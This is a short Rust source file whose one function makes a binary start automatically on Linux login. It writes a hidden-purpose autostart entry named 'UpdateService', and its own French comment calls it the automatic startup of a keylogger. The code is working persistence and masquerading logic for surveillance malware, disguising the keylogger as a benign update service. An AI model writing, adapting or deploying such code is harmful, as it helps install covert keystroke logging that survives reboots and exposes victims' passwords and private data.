use std::env;
use std::fs::{self, File};
use std::io::Write;
use std::path::PathBuf;

pub fn setup_autostart_linux() -> std::io::Result<()> {
    let autostart_dir = dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("~/.config"))
        .join("autostart");
    fs::create_dir_all(&autostart_dir)?;

    let exec_path = env::current_exe()?; // Chemin du binaire actuel

    let desktop_entry = format!(
        "[Desktop Entry]\n\
        Type=Application\n\
        Exec={}\n\
        Hidden=false\n\
        NoDisplay=false\n\
        X-GNOME-Autostart-enabled=true\n\
        Name=UpdateService\n\
        Comment=Démarrage automatique du keylogger\n",
        exec_path.display()
    );

    let mut file = File::create(autostart_dir.join("update-service.desktop"))?;
    file.write_all(desktop_entry.as_bytes())?;

    Ok(())
}
